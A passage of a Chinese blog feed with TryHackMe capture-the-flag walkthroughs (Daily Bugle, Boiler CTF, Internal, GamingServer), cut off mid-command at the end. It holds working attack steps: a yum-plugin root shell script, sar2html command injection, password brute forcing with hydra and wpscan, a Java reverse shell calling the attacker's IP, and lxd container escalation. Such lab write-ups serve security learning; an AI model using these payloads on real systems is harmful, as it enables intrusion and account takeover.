src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241008161550666-1278824895.png" alt="image-20241008161548452"></p><p>可以使用<code>yum</code>提权</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">TF=$(<span class="built_in">mktemp</span> -d)</span><br><span class="line"><span class="built_in">cat</span> &gt;<span class="variable">$TF</span>/x&lt;&lt;<span class="string">EOF</span></span><br><span class="line"><span class="string">[main]</span></span><br><span class="line"><span class="string">plugins=1</span></span><br><span class="line"><span class="string">pluginpath=$TF</span></span><br><span class="line"><span class="string">pluginconfpath=$TF</span></span><br><span class="line"><span class="string">EOF</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">cat</span> &gt;<span class="variable">$TF</span>/y.conf&lt;&lt;<span class="string">EOF</span></span><br><span class="line"><span class="string">[main]</span></span><br><span class="line"><span class="string">enabled=1</span></span><br><span class="line"><span class="string">EOF</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">cat</span> &gt;<span class="variable">$TF</span>/y.py&lt;&lt;<span class="string">EOF</span></span><br><span class="line"><span class="string">import os</span></span><br><span class="line"><span class="string">import yum</span></span><br><span class="line"><span class="string">from yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE</span></span><br><span class="line"><span class="string">requires_api_version=&#x27;2.1&#x27;</span></span><br><span class="line"><span class="string">def init_hook(conduit):</span></span><br><span class="line"><span class="string">  os.execl(&#x27;/bin/sh&#x27;,&#x27;/bin/sh&#x27;)</span></span><br><span class="line"><span class="string">EOF</span></span><br><span class="line"></span><br><span class="line">sudo yum -c <span class="variable">$TF</span>/x --enableplugin=y</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241008161921642-247827710.png" alt="image-20241008161919145"></p><p>提权成功</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241008162019148-1120378338.png" alt="image-20241008162016902"></p><p>在<code>/root</code>目录下找到<code>root.txt</code></p>]]></content>
    
    
    <summary type="html">TryHackMe系列之Daily Bugle</summary>
    
    
    
    <category term="TryHackMe" scheme="https://www.fomal.cc/categories/TryHackMe/"/>
    
    
    <category term="THM" scheme="https://www.fomal.cc/tags/THM/"/>
    
  </entry>
  
  <entry>
    <title>THM-Boiler CTF</title>
    <link href="https://www.fomal.cc/posts/39dcc2b4.html"/>
    <id>https://www.fomal.cc/posts/39dcc2b4.html</id>
    <published>2024-10-07T07:17:47.000Z</published>
    <updated>2024-10-12T08:27:02.552Z</updated>
    
    <content type="html"><![CDATA[<span id="more"></span><blockquote><p>靶机ip：10.10.20.169</p><p>攻击机ip： 10.11.101.220</p></blockquote><h1>信息收集</h1><h2 id="nmap扫描">nmap扫描</h2><p><code>nmap --min-rate 10000 -p- -sV -sC 10.10.20.169 -oN reports/namp</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241007155138247-2005312162.png" alt="image-20241007155136615"></p><p>发现开放21，80，10000，55007端口，55007端口运行着ssh服务</p><h2 id="21端口">21端口</h2><p>根据nmap的结果发现ftp可以匿名登录</p><p><code>ftp anonymous@10.10.20.169</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241007153623844-1063595684.png" alt="image-20241007153622117"></p><p>发现隐藏文件<code>.info.txt</code>，<code>get</code>下来查看</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241007153723166-2130415327.png" alt="image-20241007153721753"></p><p>内容像是被<code>rot13</code>加密过的，尝试解密</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241007154329949-234648714.png" alt="image-20241007154328354"></p><p>解密后发现是一个提示性的文字，告诉我们需要枚举</p><h2 id="80端口">80端口</h2><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241007155409570-1133252866.png" alt="image-20241007155407443"></p><p>默认页面是一个<code>apache</code>的初始页面</p><p>先扫描一下目录</p><p><code>gobuster dir -u http://10.10.20.169/ -w /usr/share/wordlists/dirb/common.txt</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241007160930195-2042932885.png" alt="image-20241007160928359"></p><p>发现很多有意思的目录，查看一下</p><h3 id="robots-txt">robots.txt</h3><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241007161042789-96937162.png" alt="image-20241007161041169"></p><p>给的目录并没有内容返回都是404，重点看下面的一串数据</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241007162017100-1297401618.png" alt="image-20241007162015403"></p><p>解密后得到另一串数据<code>99b0660cd95adea327c54182baa51584</code></p><p>看起来像md5数据，使用<code>hashcat</code>解密</p><p><code>hashcat -a 0 -m 0 hash /usr/share/wordlists/rockyou.txt</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241007162349391-1423906262.png" alt="image-20241007162347491"></p><p>解出来的数据是<code>kidding</code>，现在看来没什么用</p><h3 id="manual">manual</h3><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241007162655725-2004416225.png" alt="image-20241007162653988"></p><p>是一个<code>apache</code>的文档，可以知道的是版本号是2.4</p><h3 id="joomla">joomla</h3><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241007162747852-2035223215.png" alt="image-20241007162746149"></p><p>这是一个cms</p><h1>获取初始shell</h1><p>刚才知道了是<code>joomla</code>系统，继续深入扫描一下目录</p><p><code>gobuster dir -u http://10.10.20.169/joomla -w /usr/share/wordlists/dirb/common.txt</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241007163608399-43319589.png" alt="image-20241007163606266"></p><p>这次目录有点多</p><p>测试后发现只有几个有内容</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241007164556241-928049236.png" alt="image-20241007164554560"></p><p>最重要的是这个，在<code>/joomla/_test</code>目录下发现有<a href="https://www.onworks.net/zh-CN/software/app-sar2html">sar2html</a></p><p>使用<code>searchsploit</code>搜索一下相关漏洞</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241007165329033-1102727197.png" alt="image-20241007165327179"></p><p>用的是第一个，复制到当前目录</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241007165423725-2036887988.png" alt="image-20241007165422004"></p><p>查看内容后发现是在url处控制<code>plot</code>参数，通过值拼接实现RCE，利用一下</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241007170011069-1384604430.png" alt="image-20241007170009665"></p><p>命令执行成功</p><p>查看一下<code>log.txt</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241007170051671-1800575054.png" alt="image-20241007170050140"></p><p>发现<code>basterd</code>用户使用密码 <code>superduperp@$$</code>通过ssh连接机器，我们之前扫描结果中ssh端口发现是55007</p><p>我们使用这个凭据尝试连接</p><p><code>ssh basterd@10.10.20.169 -p 55007</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241007170420582-601376213.png" alt="image-20241007170418958"></p><p>连接成功，拿到<code>basterd</code>用户的shell</p><h1>横向移动</h1><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241007170547184-1714231114.png" alt="image-20241007170545779"></p><p>在<code>/home/basterd</code>目录发现<code>backup.sh</code>文件</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241007170641598-69828711.png" alt="image-20241007170639847"></p><p>查看后发现另一个用户<code>stoner</code>，以及密码<code>superduperp@$$no1knows</code>，直接登录<code>stoner</code>用户</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241007171143692-1069757611.png" alt="image-20241007171142250"></p><p>登陆成功</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241007171247398-1778280610.png" alt="image-20241007171245935"></p><p>在<code>/home/stoner</code>目录下找到隐藏文件<code>.secret</code>，其内容就是<code>user.txt</code></p><h1>权限提升</h1><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241007171443860-578181515.png" alt="image-20241007171442288"></p><p>并没有什么可以利用的</p><p>使用<code>find</code>看看能否有提权的机会</p><p><code>find / -perm -u=s -type f 2&gt; /dev/null</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241007171623374-472604132.png" alt="image-20241007171621747"></p><p>发现有find，利用find命令提权</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241007171908473-623085440.png" alt="image-20241007171907091"></p><p>提权成功</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241007171951300-1248330287.png" alt="image-20241007171949819"></p><p>同样在<code>/root</code>目录下获取到<code>root.txt</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241007172145341-43973699.png" alt="image-20241007172143822"></p>]]></content>
    
    
    <summary type="html">TryHackMe系列之Boiler CTF</summary>
    
    
    
    <category term="TryHackMe" scheme="https://www.fomal.cc/categories/TryHackMe/"/>
    
    
    <category term="THM" scheme="https://www.fomal.cc/tags/THM/"/>
    
  </entry>
  
  <entry>
    <title>THM-Internal</title>
    <link href="https://www.fomal.cc/posts/a77e166e.html"/>
    <id>https://www.fomal.cc/posts/a77e166e.html</id>
    <published>2024-10-07T04:37:32.000Z</published>
    <updated>2024-10-12T08:26:54.635Z</updated>
    
    <content type="html"><![CDATA[<span id="more"></span><blockquote><p>靶机ip：10.10.27.141</p><p>攻击机ip： 10.11.101.220</p></blockquote><h1>写在前面</h1><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241007125007253-1199614277.png" alt="image-20241007125005114"></p><p>要将<code>internal.thm</code>添加到<code>/etc/hosts</code> 文件中</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241007125108994-1194412670.png" alt="image-20241007125107606"></p><h1>信息收集</h1><h2 id="nmap扫描">nmap扫描</h2><p><code>nmap --min-rate 10000 -sS -sV -sC 10.10.27.141 -oN reports/nmap</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241007125129049-1554175018.png" alt="image-20241007125127613"></p><p>发现开放22端口和80端口</p><h2 id="80端口">80端口</h2><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241007125454844-2082201762.png" alt="image-20241007125453302"></p><p>是一个<code>apache</code>的初始页面，扫描一下目录</p><p><code>gobuster dir -u http://internal.thm -w /usr/share/wordlists/dirb/common.txt</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241007125552143-1556052638.png" alt="image-20241007125550493"></p><p>访问一下</p><ul><li><code>/blog</code></li></ul><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241007125736845-1392160763.png" alt="image-20241007125734839"></p><ul><li><code>/javascript</code></li></ul><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241007125747452-224993723.png" alt="image-20241007125745983"></p><ul><li><code>/phpmyadmin</code></li></ul><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241007125756599-644411919.png" alt="image-20241007125755191"></p><ul><li><code>/wordpress</code></li></ul><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241007125807763-1396057649.png" alt="image-20241007125806157"></p><p>不难看出，这是一个<code>wordpress</code>的界面，<code>wordpress</code>和<code>blog</code>是一个页面，这里以<code>/blog</code>为主，同时还有个<code>phpMyAdmin</code></p><h1>获取初始shell</h1><h2 id="登录wordpress">登录wordpress</h2><p>先看下<code>phpMyAdmin</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241007130433898-1261641608.png" alt="image-20241007130432070"></p><p>查看源码发现版本号是<code>4.6.6</code>，通过<code>searchsploit</code>搜索后发现没有什么可以利用的，将注意力转移到<code>wordpress</code></p><p>使用<code>wpscan</code>扫描一下</p><p><code>wpscan --url http://internal.thm/blog/ -e</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241007132506908-1533969406.png" alt="image-20241007132505372"></p><p>发现有个admin账户，尝试破解一下密码</p><p><code>wpscan --url http://internal.thm/blog/ -U admin -P /usr/share/wordlists/rockyou.txt</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241007133734282-1690665278.png" alt="image-20241007133732602"></p><p>爆破成功，找到了<code>admin</code>账户的密码<code>my2boys </code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241007133911002-255471056.png" alt="image-20241007133909433"></p><p>成功登录</p><h2 id="shell获取">shell获取</h2><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241007134757805-2134124194.png" alt="image-20241007134755947"></p><p>在这里发现可以随意更改文件内容。这里将<code>404.php</code>内容改成反弹shell的文件是<a href="https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php">php-reverse-shell</a>，修改<code>ip</code>和<code>port</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241007135148884-1540858205.png" alt="image-20241007135147307"></p><p>点击下买你的更新文件。然后在kali上创建监听</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241007135222394-569063211.png" alt="image-20241007135221038"></p><p>现在需要找到<code>404.php</code>文件的位置，从路由中可以看到主题是<code>twentyseventeen</code>，而且大多数主题位于<code>wp-content</code> 目录下，主题位于<code>/wp-content/themes</code>目录下，所以<code>404.php</code>文件的位置是：<code>/wp-content/themes/twentyseventeen/404.php</code></p><p>访问文件<code>http://internal.thm/blog/wp-content/themes/twentyseventeen/404.php</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241007135720735-27264363.png" alt="image-20241007135719154"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241007135738379-51772723.png" alt="image-20241007135736972"></p><p>这样我们就拿到了低权用户的shell</p><p>先获取交互式shell</p><p><code>python -c 'import pty;pty.spawn(&quot;/bin/bash&quot;)'</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241007135936004-77642626.png" alt="image-20241007135934513"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241007140015991-900638678.png" alt="image-20241007140014508"></p><p>在<code>/home</code>目录下有个<code>aubreanna</code>用户，现在目标就是提升至user权限</p><h1>提升至user权限</h1><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241007140610859-829745507.png" alt="image-20241007140609325"></p><p>在翻阅目录的过程中发现在 <code>/opt</code>目录下有个<code>wp-save.txt</code>文件，并且这是我们可以查看的文件，查看一下</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241007140728583-62091955.png" alt="image-20241007140727188"></p><p>得到了<code>aubreanna</code>用户的密码<code>bubb13guM!@#123</code>，登录<code>aubreanna</code>用户</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241007140837240-798440971.png" alt="image-20241007140835640"></p><p>成功登录</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241007140901515-1447831069.png" alt="image-20241007140900121"></p><p>在<code>/home/aubreanna</code>下找到<code>user.txt</code></p><h1>提升至root权限</h1><p>发现在这个目录还有<code>jenkins.txt</code>文件，查看一下</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241007141130806-1153980717.png" alt="image-20241007141129333"></p><p>告诉我们内网<code>Jenkins</code>服务的地址是<code>172.17.0.2:8080</code></p><p>先简单看一下服务</p><p><code>curl http://172.17.0.2:8080</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241007141312485-108597353.png" alt="image-20241007141310725"></p><p>由于目标机器的端口<code>8080</code>只能通过目标机的本地进行访问，所以我们需要设置SSH端口转发，从而将目标机器<code>8080</code>端口上的流量重定向到我们本地攻击机上的地址和端口<code>localhost:8081</code>，在攻击机上的终端界面构造如下命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">ssh -f -N -L 8081:172.17.0.2:8080 aubreanna@internal.thm</span><br><span class="line"><span class="comment">#根据前述结果，登录密码为：bubb13guM!@#123</span></span><br><span class="line"><span class="comment">#ssh端口转发(本地网卡地址0.0.0.0可省略)：HostB$ ssh -L 0.0.0.0:PortB:HostC:PortC user@HostC</span></span><br><span class="line"><span class="comment">#参数说明</span></span><br><span class="line"><span class="comment">#-C：压缩数据</span></span><br><span class="line"><span class="comment">#-f ：后台认证用户/密码，通常和-N连用，不用登录到远程主机。</span></span><br><span class="line"><span class="comment">#-N ：不执行脚本或命令，通常与-f连用。</span></span><br><span class="line"><span class="comment">#-g ：在-L/-R/-D参数中，允许远程主机连接到建立转发的端口，如果不加这个参数，只允许本地主机建立连接。</span></span><br><span class="line"><span class="comment">#-L : 本地隧道，本地端口:目标IP:目标端口</span></span><br><span class="line"><span class="comment">#-D : 动态端口转发</span></span><br><span class="line"><span class="comment">#-R : 远程隧道</span></span><br><span class="line"><span class="comment">#-T ：不分配 TTY 只做代理用</span></span><br><span class="line"><span class="comment">#-q ：安静模式，不输出 错误/警告 信息</span></span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241007143027902-1109898380.png" alt="image-20241007143026526"></p><p>输入密码后即可访问服务</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241007143014999-1246675905.png" alt="image-20241007143013118"></p><p>网上的默认密码无法登录，这里使用<code>hydra</code>暴力破解，先找到登录框的表单内容</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241007144307417-1663244639.png" alt="image-20241007144305568"></p><p>找到后就可以构造命令了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hydra -l admin -P /usr/share/wordlists/rockyou.txt -s 8081 127.0.0.1 http-post-form &quot;/j_acegi_security_check:j_username=admin&amp;j_password=^PASS^&amp;from=%2F&amp;Submit=Sign+in&amp;Login=Login:Invalid username or password&quot;</span><br><span class="line"></span><br><span class="line">#&quot;/j_acegi_security_check:j_username=admin&amp;j_password=^PASS^&amp;from=%2F&amp;Submit=Sign+in:F=Invalid username or password&quot;</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241007145155569-23242268.png" alt="image-20241007145153970"></p><p>成功爆破出密码<code>spongebob</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241007145245979-419572187.png" alt="image-20241007145244248"></p><p>成功登录！</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241007145414836-343618295.png" alt="image-20241007145413172"></p><p>在管理界面，有一个可以执行命令的地方，在攻击机先建立监听</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241007145514017-720666410.png" alt="image-20241007145512664"></p><p>然后再执行反弹shell的命令</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">String host=<span class="string">&quot;10.11.101.220&quot;</span>;</span><br><span class="line"><span class="type">int</span> port=<span class="number">8889</span>;</span><br><span class="line">String cmd=<span class="string">&quot;/bin/bash&quot;</span>;</span><br><span class="line">Process p=<span class="keyword">new</span> <span class="title class_">ProcessBuilder</span>(cmd).redirectErrorStream(<span class="literal">true</span>).start();Socket s=<span class="keyword">new</span> <span class="title class_">Socket</span>(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();<span class="keyword">while</span>(!s.isClosed())&#123;<span class="keyword">while</span>(pi.available()&gt;<span class="number">0</span>)so.write(pi.read());<span class="keyword">while</span>(pe.available()&gt;<span class="number">0</span>)so.write(pe.read());<span class="keyword">while</span>(si.available()&gt;<span class="number">0</span>)po.write(si.read());so.flush();po.flush();Thread.sleep(<span class="number">50</span>);<span class="keyword">try</span> &#123;p.exitValue();<span class="keyword">break</span>;&#125;<span class="keyword">catch</span> (Exception e)&#123;&#125;&#125;;p.destroy();s.close();</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241007145627071-645137157.png" alt="image-20241007145625573"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241007145649065-1090977695.png" alt="image-20241007145647641"></p><p>拿到<code>jenkins</code>的shell</p><p>转到交互式shell</p><p><code>python -c 'import pty;pty.spawn(&quot;/bin/bash&quot;)'</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241007145819229-990567029.png" alt="image-20241007145817874"></p><p>依旧是在老位置<code>/opt</code>下找到<code>note.txt</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241007145855094-105871939.png" alt="image-20241007145853700"></p><p>得到<code>root</code>用户的密码：<code>tr0ub13guM!@#123</code></p><p>直接<code>ssh</code>登录<code>root</code></p><p><code>ssh root@10.10.27.141</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241007150058524-1354823152.png" alt="image-20241007150056965"></p><p>成功登录</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241007150120478-264508902.png" alt="image-20241007150119151"></p><p>在当前目录找到<code>root.txt</code></p>]]></content>
    
    
    <summary type="html">TryHackMe系列之Internal</summary>
    
    
    
    <category term="TryHackMe" scheme="https://www.fomal.cc/categories/TryHackMe/"/>
    
    
    <category term="THM" scheme="https://www.fomal.cc/tags/THM/"/>
    
  </entry>
  
  <entry>
    <title>THM-GamingServer</title>
    <link href="https://www.fomal.cc/posts/91bbca54.html"/>
    <id>https://www.fomal.cc/posts/91bbca54.html</id>
    <published>2024-10-06T05:28:31.000Z</published>
    <updated>2024-10-12T08:26:36.842Z</updated>
    
    <content type="html"><![CDATA[<span id="more"></span><blockquote><p>靶机ip：10.10.121.5</p><p>攻击机ip： 10.11.101.220</p></blockquote><h1>信息收集</h1><h2 id="nmap扫描">nmap扫描</h2><p><code>nmap --min-rate 10000 -sS -sV -sC 10.10.121.5</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241006142138386-1644378651.png" alt="image-20241006142136365"></p><p>只开放了22和80端口</p><h2 id="80端口">80端口</h2><p>![image-20241C:/Users/lemon/AppData/Roaming/Typora/typora-user-images/image-20241006142532131.png)</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241006142535295-1944826601.png" alt="image-20241006142533235"></p><p>非常炫酷的界面</p><p>浏览之后发现在<code>http://10.10.121.5/about.html#</code> 下，有个<code>upload</code>按钮，点击一下</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241006142812327-1270244026.png" alt="image-20241006142810609"></p><p>这时候发现就跳转到了可以浏览目录的页面</p><h2 id="信息分析">信息分析</h2><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241006142836482-132291457.png" alt="image-20241006142835118"></p><p>在<code>dict.lst</code>中是一个字典</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241006142914037-561726342.png" alt="image-20241006142912365"></p><p>将其下载到本地，留着以后可能用得上</p><p><code>manifesto.txt</code>内容如下，是一封信</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241006143159087-987491040.png" alt="image-20241006143157410"></p><p>得到一个用户名<code>Mentor</code></p><p>现在我们有了一个用户名和一个密码字典，之前端口探测的时候，发现22端口是开放的，我们可以尝试通过爆破<code>ssh</code>密码尝试登录</p><h1>获取普通权限</h1><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241006144348962-739972565.png" alt="image-20241006144347297"></p><p>很可惜，没有破解成功，继续尝试扫描一下目录</p><p><code>gobuster dir -u http://10.10.121.5/ -w /usr/share/wordlists/dirb/common.txt</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241006144925900-1562652202.png" alt="image-20241006144924456"></p><p>发现有几个特别的信息，查看一下</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241006145023295-181828212.png" alt="image-20241006145021856"></p><p><code>robots.txt</code>里的信息并不太重要，因为我们之前点击<code>upload</code>访问过这个目录</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241006145111847-955401844.png" alt="image-20241006145110462"></p><p>这个<code>/secret</code>目录是个新目录，之前没有找到，查看一下<code>secretKey</code>文件</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241006145149070-1566565554.png" alt="image-20241006145147571"></p><p>发现这是<code>RSA</code>私钥文件，下载下来保存为<code>id_rsa</code>并赋予<code>600</code>权限，可以爆破加密私钥的密码</p><p>先将<code>id_rsa</code>转换为hash格式</p><p><code>ssh2john id_rsa &gt; rsa_hash</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241006150305820-1630075297.png" alt="image-20241006150304289"></p><p>使用<code>john</code>开始爆破</p><p><code>john rsa_hash --wordlist=/usr/share/wordlists/rockyou.txt</code></p><p>使用<code>john rsa_hash --show</code>查看结果</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241006150549966-1727897226.png" alt="image-20241006150548683"></p><p>找到密码<code>letmein</code>，使用ssh私钥登录</p><p><code>ssh Mentor@10.10.121.5 -i id_rsa</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241006151533269-1114822329.png" alt="image-20241006151531886"></p><p>登陆后还是失败了，肯定是之前有哪些信息没有注意到</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241006151645250-647968347.png" alt="image-20241006151643801"></p><p>在首页源码处发现另一个用户<code>john</code>，使用这个用户尝试登录</p><p><code>ssh john@10.10.121.5 -i id_rsa</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241006151828540-1248866941.png" alt="image-20241006151827027"></p><p>登陆成功，看来之前的那封信只是一封信而已</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241006153331301-1480645588.png" alt="image-20241006153329663"></p><p>直接在当前目录找到<code>user.txt</code></p><h1>权限提升</h1><p><code>sudo -l</code>由于缺少密码利用不了，查看其他内容时也没有可以利用的信息</p><p>使用<code>id</code>查看一下当前权限</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241006153616066-342538492.png" alt="image-20241006153614508"></p><p>发现可以利用<code>lxd</code>提权</p><ul><li>攻击机准备</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">通过git将构建好的alpine镜像克隆至本地；执行“build -alpine”命令完成最新版本的Alpine镜像构建，此操作必须由root用户完成</span><br><span class="line">将tar文件发送至目标设备</span><br><span class="line"></span><br><span class="line">git <span class="built_in">clone</span>  https://github.com/saghul/lxd-alpine-builder.git</span><br><span class="line"><span class="built_in">cd</span> lxd-alpine-builder</span><br><span class="line">./build-alpine</span><br><span class="line">运行完上述命令之后，会在当前目录下创建一个tar.gz文件，之后我们需要将其发送至目标系统</span><br><span class="line"></span><br><span class="line">另一方面，我们还需要将alpine镜像发送至目标系统的/tmp目录中</span><br><span class="line">python -m http.server 8081</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241006160509601-1470459792.png" alt="image-20241006160508143"></p><ul><li>靶机操作</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /tmp</span><br><span class="line">wget http://10.11.101.220:8081/apline-v3.10-x86_64-20191008_1227.tar.gz</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241006160621679-466446020.png" alt="image-20241006160620196"></p><p>镜像构建完成之后，我们就可以将其以镜像的形式添加进LXD了</p><p><code>lxc image import ./alpine-v3.13-x86_64-20210218_0139.tar.gz --alias myimage</code></p><p>使用<code>lxc image list</code>命令即可检查可用的容器列表</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241006160943758-117140868.png" alt="image-20241006160942338"></p><p>执行以下命令进行提权</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">lxc init myimage ignite -c security.privileged=<span class="literal">true</span></span><br><span class="line">lxc config device add ignite mydevice disk <span class="built_in">source</span>=/ path=/mnt/root recursive=<span class="literal">true</span></span><br><span class="line">lxc start ignite</span><br><span class="line">lxc <span class="built_in">exec</span> ignite /bin/sh</span><br><span class="line"><span 